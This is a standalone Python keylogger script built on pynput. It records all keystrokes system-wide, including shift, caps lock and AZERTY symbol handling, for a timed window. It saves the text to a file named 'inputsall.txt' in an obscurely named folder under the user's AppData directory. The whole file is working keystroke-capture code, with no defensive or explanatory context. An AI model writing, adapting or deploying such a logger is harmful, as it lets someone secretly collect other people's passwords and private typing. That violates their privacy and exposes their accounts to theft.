import time
import os
import sys
import threading
from pynput import keyboard

# === CONFIG ===
LOG_DURATION = int(sys.argv[1]) if len(sys.argv) > 1 else 40  # Default to 40 seconds if no argument
SAVE_PATH = r"C:\Users\PROF\AppData\Local\py"
FILENAME = "inputsall.txt"

# === GLOBAL STATES ===
shift_pressed = False
caps_lock_on = False
log_started = False
logging_done = False
log = []

# === NUMPAD VK CODES (AZERTY-safe) ===
numpad_vk_map = {
    96: '0',
    97: '1',
    98: '2',
    99: '3',
    100: '4',
    101: '5',
    102: '6',
    103: '7',
    104: '8',
    105: '9',
    110: '.',  # Decimal point
    111: '/',  # Slash
}

# === AZERTY VK SYMBOL FALLBACK MAP ===
fallback_vk_map = {
    191: '/',  # Slash (main keyboard)
    189: '-',  # Minus
    187: '=',  # Equals
    188: ',',  # Comma
    190: '.',  # Period
    186: ';',
    222: "'",
    220: '\\',
    219: '[',
    221: ']',
    192: '²',   # AZERTY top-left
}

def is_caps(letter):
    return (shift_pressed ^ caps_lock_on)

def save_log(log_text):
    if not os.path.exists(SAVE_PATH):
        os.makedirs(SAVE_PATH)
    full_path = os.path.join(SAVE_PATH, FILENAME)
    with open(full_path, "w", encoding="utf-8") as f:
        f.write(log_text)

def start_timer():
    global logging_done
    time.sleep(LOG_DURATION)
    logging_done = True

def listener_thread():
    global shift_pressed, caps_lock_on, log_started, logging_done, log

    def on_press(key):
        global shift_pressed, caps_lock_on, log_started
        if not log_started:
            log_started = True
            threading.Thread(target=start_timer, daemon=True).start()

        if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            shift_pressed = True
        elif key == keyboard.Key.caps_lock:
            caps_lock_on = not caps_lock_on
        elif key == keyboard.Key.space:
            log.append(' ')
        elif key == keyboard.Key.enter:
            log.append('\n')
        elif key == keyboard.Key.backspace:
            if log:
                log.pop()
        elif hasattr(key, 'vk') and key.vk in numpad_vk_map:
            log.append(numpad_vk_map[key.vk])
        elif hasattr(key, 'char') and key.char is not None:
            char = key.char
            if char.isalpha():
                log.append(char.upper() if is_caps(char) else char.lower())
            else:
                log.append(char)
        elif hasattr(key, 'vk') and key.vk in fallback_vk_map:
            log.append(fallback_vk_map[key.vk])

    def on_release(key):
        global shift_pressed
        if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            shift_pressed = False

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        while not logging_done:
            time.sleep(0.1)
        listener.stop()

def main():
    print(f"Logging all keystrokes for {LOG_DURATION} seconds...")
    listener_thread()
    print("Logging done. Saving log...")
    save_log(''.join(log))
    print(f"Saved to {os.path.join(SAVE_PATH, FILENAME)}")

if __name__ == "__main__":
    main()
